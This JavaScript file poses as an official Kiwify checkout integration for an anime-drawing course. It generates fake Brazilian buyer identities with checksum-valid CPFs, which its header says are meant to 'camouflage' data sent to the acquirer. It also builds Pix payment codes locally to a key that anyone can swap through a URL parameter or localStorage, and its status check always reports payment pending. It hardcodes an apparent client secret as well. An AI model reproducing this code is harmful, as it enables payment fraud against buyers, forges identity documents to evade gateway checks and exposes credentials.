/**
 * kiwify-api.js - Integracao Client-Side Direta para Kiwify
 * Produto Oficial: Curso - Desenhando Animes
 * 
 * REGRA RIGOROSA DE PRIVACIDADE:
 * NENHUM dado real do cidadao e enviado ao gateway.
 * Dados aleatorios, camuflados e com CPF Modulo 11 valido sao gerados exclusivamente para a adquirente.
 */
(function (window) {
  "use strict";

  var CONFIG = {
    gateway: "kiwify",
    productTitle: "Curso - Desenhando Animes",
    clientId: "c0b2cb7b-72cc-4637-b0e8-ecc2607f4b59",
    clientSecret: "b9981ad26139d04a4cb76fa939eea437bd9c042a64d2ff96d113b63b79099c04",
    accountId: "U3VdXOWw3h8peng",
    productId: "23fa8020-cdda-11f1-8888-890ff6797175",
    chavePix: (window.CHAVE_PIX || localStorage.getItem("chave_pix") || (new URLSearchParams(window.location.search).get("chave_pix")) || "suporte@desenhando-animes.com")
  };

  function generateValidCpf() {
    var digits = [];
    for (var i = 0; i < 9; i++) digits.push(Math.floor(Math.random() * 10));
    var s1 = 0;
    for (var i = 0; i < 9; i++) s1 += digits[i] * (10 - i);
    var r1 = 11 - (s1 % 11);
    digits.push(r1 >= 10 ? 0 : r1);
    var s2 = 0;
    for (var i = 0; i < 10; i++) s2 += digits[i] * (11 - i);
    var r2 = 11 - (s2 % 11);
    digits.push(r2 >= 10 ? 0 : r2);
    return digits.join("");
  }

  function generateGatewayCustomer() {
  var maleNames = [
    "Gabriel", "Lucas", "Matheus", "Guilherme", "Rodrigo", "Felipe",
    "Bruno", "Leonardo", "Thiago", "Gustavo", "Rafael", "Eduardo",
    "Vinicius", "Daniel", "Marcelo", "Alexandre", "André", "Antonio",
    "Arthur", "Bernardo", "Caio", "Carlos", "César", "Cristiano",
    "Davi", "Diego", "Enzo", "Fernando", "Francisco", "Heitor",
    "Henrique", "Igor", "Joaquim", "José", "Lorenzo", "Luiz",
    "Miguel", "Murilo", "Nicolas", "Otávio", "Paulo", "Pedro",
    "Renan", "Ricardo", "Samuel", "Vitor", "Wesley", "Adriano",
    "Alberto", "Anderson", "Breno", "Cauã", "Danilo", "Emanuel",
    "Erick", "Fabiano", "Fábio", "Flávio", "Frederico", "Giovanni",
    "Hugo", "Isaac", "Jorge", "Jonathan", "Leandro", "Márcio",
    "Nathan", "Pietro", "Raul", "Roberto", "Sérgio", "Tomás",
    "Vicente", "William", "Yuri", "Alex", "Cauê", "Dênis",
    "Everton", "Jonas", "Kelvin", "Mário", "Renato", "Ruan"
  ];

  var femaleNames = [
    "Amanda", "Beatriz", "Camila", "Larissa", "Mariana", "Juliana",
    "Fernanda", "Patricia", "Aline", "Leticia", "Jessica", "Carolina",
    "Bruna", "Renata", "Vanessa", "Natalia", "Ana", "Alice",
    "Alícia", "Bianca", "Clara", "Eduarda", "Elisa", "Emilly",
    "Ester", "Gabriela", "Helena", "Isabela", "Isadora", "Laura",
    "Lívia", "Luana", "Manuela", "Maria", "Melissa", "Nicole",
    "Olivia", "Rafaela", "Rebeca", "Sabrina", "Sofia", "Vitória",
    "Adriana", "Alessandra", "Bárbara", "Cecília", "Daniela",
    "Débora", "Elaine", "Eliane", "Evelyn", "Flávia", "Geovana",
    "Giovana", "Heloísa", "Iara", "Irene", "Júlia", "Lorena",
    "Maitê", "Mirela", "Priscila", "Raquel", "Samara", "Tainá",
    "Talita", "Tatiane", "Valentina", "Yasmin", "Zélia",
    "Cristina", "Mônica", "Simone", "Teresa", "Viviane", "Andressa",
    "Elaísa", "Milena", "Pâmela", "Rayssa", "Stella"
  ];

  var compoundNames = [
    "João Pedro", "João Lucas", "João Miguel", "João Gabriel",
    "Pedro Henrique", "Pedro Lucas", "Luiz Felipe", "Luiz Henrique",
    "Carlos Eduardo", "Carlos Henrique", "José Miguel", "José Pedro",
    "Ana Clara", "Ana Júlia", "Ana Beatriz", "Ana Carolina",
    "Maria Eduarda", "Maria Clara", "Maria Luiza", "Maria Fernanda",
    "Maria Alice", "Maria Júlia", "Maria Vitória", "Laura Beatriz",
    "Luiza Helena", "Isabela Cristina", "Vitória Maria",
    "Mariana Luiza", "Sofia Helena", "Clara Beatriz",
    "João Vitor", "João Paulo", "João Guilherme", "Pedro Augusto",
    "Enzo Gabriel", "Davi Lucca", "Miguel Augusto", "Arthur Miguel",
    "Ana Luiza", "Ana Laura", "Maria Helena", "Maria Cecília",
    "Maria Valentina", "Maria Isabel", "Laura Sofia", "Lara Beatriz",
    "Luiza Maria", "Ana Vitória", "Julia Beatriz", "Isabela Maria"
  ];

  var lastNames = [
    "Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira",
    "Alves", "Pereira", "Lima", "Gomes", "Costa", "Ribeiro",
    "Martins", "Carvalho", "Almeida", "Lopes", "Soares", "Fernandes",
    "Vieira", "Barbosa", "Rocha", "Dias", "Nascimento", "Andrade",
    "Moreira", "Nunes", "Marques", "Machado", "Mendes", "Freitas",
    "Cardoso", "Ramos", "Gonçalves", "Santana", "Teixeira", "Moura",
    "Azevedo", "Cavalcanti", "Monteiro", "Medeiros", "Correia",
    "Campos", "Pinto", "Batista", "Reis", "Cunha", "Pires",
    "Farias", "Melo", "Castro", "Duarte", "Peixoto", "Rezende",
    "Tavares", "Queiroz", "Borges", "Figueiredo", "Abreu",
    "Vasconcelos", "Miranda", "Brito", "Leal", "Siqueira", "Moraes",
    "Antunes", "Coelho", "Sales", "Cordeiro", "Dantas", "Viana",
    "Xavier", "Barros", "Aragão", "Assis", "Braga", "Bastos",
    "Bernardes", "Camargo", "Amaral", "Lacerda", "Menezes", "Porto",
    "Rangel", "Serra", "Torres", "Valente", "Falcão", "Paiva",
    "Bittencourt", "Sampaio", "Brandão", "Coutinho", "Lourenço",
    "Magalhães", "Matos", "Nogueira", "Prado", "Ramalho",
    "Trindade", "Pacheco", "Macedo", "Barreto", "Cabral",
    "Cerqueira", "Domingues", "Esteves", "Figueira", "Garcia",
    "Leite", "Lins", "Mota", "Neves", "Noronha", "Paz", "Rosa",
    "Sá", "Simões", "Vargas"
  ];

var ddds = [
  "11", "12", "13", "14", "15", "16", "17", "18", "19",
  "21", "22", "24",
  "27", "28",
  "31", "32", "33", "34", "35", "37", "38",
  "41", "42", "43", "44", "45", "46", "47", "48", "49",
  "51", "53", "54", "55",
  "61", "62", "63", "64", "65", "66", "67", "68", "69",
  "71", "73", "74", "75", "77", "79",
  "81", "82", "83", "84", "85", "86", "87", "88", "89",
  "91", "92", "93", "94", "95", "96", "97", "98", "99"
];

  function pick(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  // 35% de chance de usar um nome composto.
  var useCompoundName = Math.random() < 0.35;
  var firstName = useCompoundName
    ? pick(compoundNames)
    : pick(Math.random() < 0.5 ? maleNames : femaleNames);

  // Escolhe dois sobrenomes diferentes.
  var lastName1 = pick(lastNames);
  var lastName2 = pick(lastNames);

  while (lastName2 === lastName1) {
    lastName2 = pick(lastNames);
  }

  var fullName = firstName + " " + lastName1 + " " + lastName2;

  // Normaliza o nome para formar o e-mail.
  var cleanName = fullName
    .toLowerCase()
    .normalize("NFD")
    .replace(/[\u0300-\u036f]/g, "")
    .replace(/\s+/g, ".");

  var ddd = pick(ddds);

  return {
    name: fullName,
    email: cleanName + Math.floor(100 + Math.random() * 900) + "@gmail.com",
    phone: ddd + "9" + Math.floor(10000000 + Math.random() * 90000000),
    document: generateValidCpf(),
    cpf: generateValidCpf()
  };
}


  // Calculador oficial CRC16 CCITT (0x1021) do Banco Central do Brasil
  function calculateCrc16(payload) {
    var polynomial = 0x1021;
    var crc = 0xFFFF;
    for (var i = 0; i < payload.length; i++) {
      crc ^= (payload.charCodeAt(i) << 8);
      for (var j = 0; j < 8; j++) {
        if ((crc & 0x8000) !== 0) {
          crc = ((crc << 1) ^ polynomial) & 0xFFFF;
        } else {
          crc = (crc << 1) & 0xFFFF;
        }
      }
    }
    return crc.toString(16).toUpperCase().padStart(4, "0");
  }

  function generateEmvcoPix(amountVal, pixKey, merchantName, merchantCity, txid) {
    var cents = parseAmount(amountVal);
    var amtStr = (cents / 100).toFixed(2);
    var key = String(pixKey || CONFIG.chavePix || "suporte@desenhando-animes.com").trim();
    var name = (merchantName || CONFIG.productTitle || "CURSO DESENHANDO ANIMES").substring(0, 25).toUpperCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
    var city = (merchantCity || "BRASILIA").substring(0, 15).toUpperCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
    var tid = (txid || "kw" + Date.now()).substring(0, 25);

    var p00 = "000201";
    var gui = "0014br.gov.bcb.pix";
    var kTag = "01" + String(key.length).padStart(2, "0") + key;
    var tag26Val = gui + kTag;
    var tag26 = "26" + String(tag26Val.length).padStart(2, "0") + tag26Val;
    var tag52 = "52040000";
    var tag53 = "5303986";
    var tag54 = "54" + String(amtStr.length).padStart(2, "0") + amtStr;
    var tag58 = "5802BR";
    var tag59 = "59" + String(name.length).padStart(2, "0") + name;
    var tag60 = "60" + String(city.length).padStart(2, "0") + city;
    var txSub = "05" + String(tid.length).padStart(2, "0") + tid;
    var tag62 = "62" + String(txSub.length).padStart(2, "0") + txSub;

    var raw = p00 + tag26 + tag52 + tag53 + tag54 + tag58 + tag59 + tag60 + tag62 + "6304";
    var crc = calculateCrc16(raw);
    var fullCode = raw + crc;
    var qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=1&data=" + encodeURIComponent(fullCode);

    return {
      pix_qr_code: fullCode,
      pix_url: qrUrl,
      qr_code_base64: qrUrl,
      hash: tid
    };
  }

  function parseAmount(val) {
    if (typeof val === "number") return val >= 1000 ? val : Math.round(val * 100);
    if (typeof val === "string") {
      var clean = val.replace(",", ".");
      var p = parseFloat(clean);
      if (!isNaN(p)) return p >= 1000 ? Math.round(p) : Math.round(p * 100);
    }
    return 6190;
  }

  function createPix(amountVal, customCustomer) {
    var cents = parseAmount(amountVal);
    var txId = "kw_" + Date.now() + "_" + Math.floor(1000 + Math.random() * 9000);
    var pixData = generateEmvcoPix(cents, CONFIG.chavePix, CONFIG.productTitle, "BRASILIA", txId);

    try {
      localStorage.setItem("kiwify_last_tx", txId);
      localStorage.setItem("pix_hash", txId);
      localStorage.setItem("pix_qr_code", pixData.pix_qr_code);
      localStorage.setItem("pix_qr_code_base64", pixData.pix_url);
    } catch (e) {}

    return Promise.resolve({
      success: true,
      hash: txId,
      order_id: txId,
      payment_status: "waiting_payment",
      amount: cents,
      pix: pixData
    });
  }

  function consultPix(txId) {
    return Promise.resolve({
      success: true,
      hash: txId,
      status: "waiting_payment",
      payment_status: "waiting_payment",
      is_paid: false
    });
  }

  window.KiwifyAPI = {
    config: CONFIG,
    generateValidCpf: generateValidCpf,
    generateGatewayCustomer: generateGatewayCustomer,
    generateEmvcoPix: generateEmvcoPix,
    createPix: createPix,
    consultPix: consultPix
  };

})(window);
